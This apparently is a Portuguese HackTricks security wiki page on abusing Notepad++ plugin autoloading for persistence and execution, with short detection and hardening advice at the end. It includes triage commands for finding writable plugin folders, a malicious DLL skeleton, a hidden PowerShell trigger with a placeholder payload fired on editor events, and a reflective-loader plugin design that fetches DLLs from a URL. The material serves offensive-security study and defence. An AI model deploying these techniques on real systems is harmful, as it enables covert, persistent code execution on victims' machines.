# Persistência e execução por carregamento automático de plugins do Notepad++

{{#include ../../banners/hacktricks-training.md}}

O Notepad++ **carrega automaticamente todos os DLLs de plugins encontrados nas subpastas `plugins`** ao iniciar. Colocar um plugin malicioso em qualquer **instalação do Notepad++ com permissão de escrita** permite executar código dentro de `notepad++.exe` sempre que o editor é iniciado, o que pode ser usado para **persistência**, **execução inicial** furtiva ou como um **loader em processo** se o editor for iniciado com privilégios elevados.<sup>[[1]](#references)</sup>

Desde o **Notepad++ 7.6+**, o layout esperado para instalação manual é **uma subpasta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). No **modo portátil** (quando há um `doLocalConf.xml` ao lado de `notepad++.exe`), toda a árvore do aplicativo permanece local nesse diretório, o que muitas vezes transforma conjuntos de ferramentas copiados ou administrativos em uma superfície de execução facilmente gravável pelo usuário.<sup>[[2]](#references)</sup>

## Locais graváveis para plugins

- Instalação padrão: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (geralmente exige privilégios de administrador para gravar).<sup>[[1]](#references)</sup>
- Opções graváveis para operadores com poucos privilégios:<sup>[[1]](#references)</sup>
  - Use a **versão portátil do Notepad++** em uma pasta gravável pelo usuário.
  - Copie `C:\Program Files\Notepad++` para um caminho controlado pelo usuário (por exemplo, `%LOCALAPPDATA%\npp\`) e execute `notepad++.exe` a partir desse local.
  - Procure **conjuntos de ferramentas administrativas**, cópias extraídas de arquivos zip ou kits de ferramentas de suporte que já contenham `doLocalConf.xml` e estejam fora de `Program Files`.
- Cada plugin tem sua própria subpasta em `plugins` e é carregado automaticamente na inicialização; as entradas do menu aparecem em **Plugins**.<sup>[[2]](#references)</sup>

Triagem rápida:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Pontos de carregamento do plugin (primitivas de execução)
O Notepad++ espera **funções exportadas** específicas. Todas são chamadas durante a inicialização, oferecendo várias superfícies de execução:<sup>[[1]](#references)</sup>
- **`DllMain`** — executada imediatamente ao carregar a DLL (primeiro ponto de execução).
- **`setInfo(NppData)`** — chamada uma vez durante o carregamento para fornecer os handles do Notepad++; local típico para registrar itens de menu.
- **`getName()`** — retorna o nome do plugin exibido no menu.
- **`getFuncsArray(int *nbF)`** — retorna os comandos do menu; mesmo que esteja vazio, é chamada durante a inicialização.
- **`beNotified(SCNotification*)`** — recebe eventos do Notepad++ / Scintilla (útil para adiar payloads até uma ação do usuário ou um evento do editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manipulador de mensagens, útil para trocas de dados maiores.
- **`isUnicode()`** — sinalizador de compatibilidade verificado durante o carregamento.

A maioria das funções exportadas pode ser implementada como **stubs**; a execução pode ocorrer em `DllMain` ou em qualquer callback acima durante o carregamento automático.

## Esqueleto mínimo de plugin malicioso
Compile uma DLL com as funções exportadas esperadas e coloque-a em `plugins\\MyNewPlugin\\MyNewPlugin.dll`, dentro de uma pasta gravável do Notepad++:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Compile a DLL (Visual Studio/MinGW).
2. Crie a subpasta do plugin em `plugins` e coloque a DLL nela.
3. Reinicie o Notepad++; a DLL será carregada automaticamente, executando `DllMain` e os callbacks subsequentes.

## Padrão de acionamento de baixo ruído via beNotified
Por OPSEC, muitos payloads **não** devem ser executados a partir de `DllMain`. Um padrão mais discreto é permitir que o plugin seja carregado normalmente e, em seguida, executar o código somente após um evento realista do editor, como **conclusão da inicialização**, **ativação do buffer** ou o **primeiro caractere digitado**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Isso corresponde melhor à pesquisa ofensiva pública do que a um beacon ruidoso em `DllMain`: a DLL ainda é carregada automaticamente na inicialização, mas a ação maliciosa é adiada até que o Notepad++ pareça estar realmente em uso.

## Usar o diretório de configuração do plugin como armazenamento secundário
O Notepad++ expõe `NPPM_GETPLUGINSCONFIGDIR`, que retorna o **diretório de configuração de plugins do usuário atual**.<sup>[[3]](#references)</sup> Um plugin malicioso pode usar isso para manter a DLL em disco mínima enquanto armazena configurações criptografadas, payloads preparados ou arquivos de tarefas em um caminho que se mistura ao estado normal dos plugins.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operacionalmente, isso é útil quando você quer:
- uma pequena DLL bootstrap carregada automaticamente;
- tasking por usuário sem mexer novamente no binário principal do plugin;
- separar o **gatilho de carregamento automático** do segundo estágio mais pesado.

## Padrão de plugin de reflective loader
Um plugin weaponized pode transformar o Notepad++ em um **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Apresentar uma interface/menu mínimo (por exemplo, "LoadDLL").
- Aceitar um **caminho de arquivo** ou uma **URL** para buscar uma payload DLL.
- Mapear a DLL de forma reflective no processo atual e invocar um entry point exportado (por exemplo, uma função loader dentro da DLL obtida).
- Benefício: reutilizar um processo GUI com aparência benigna em vez de iniciar um novo loader; a payload herda a integridade de `notepad++.exe` (inclusive em contextos elevados).
- Desvantagens: gravar em disco uma **DLL de plugin unsigned** gera ruído; uma variação prática é usar o plugin carregado automaticamente apenas como stub e manter o implant real criptografado/estagiado em outro local.

## Observações sobre detecção e hardening
- Bloqueie ou monitore **gravações nos diretórios de plugins do Notepad++** (incluindo cópias portáteis em perfis de usuário); habilite o acesso controlado a pastas ou a allowlisting de aplicações.
- Gere alertas para **novas DLLs unsigned** em `plugins`, alterações nas árvores do Notepad++ portátil e **processos filho/atividade de rede** incomuns originados de `notepad++.exe`.
- Estabeleça uma baseline dos plugins legítimos e investigue qualquer DLL nova que exporte a interface normal de plugin do Notepad++ e também inicie shells, PowerShell ou beacons de rede.
- Exija a instalação de plugins somente pelo **Plugins Admin** e restrinja a execução de cópias portáteis em caminhos não confiáveis.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
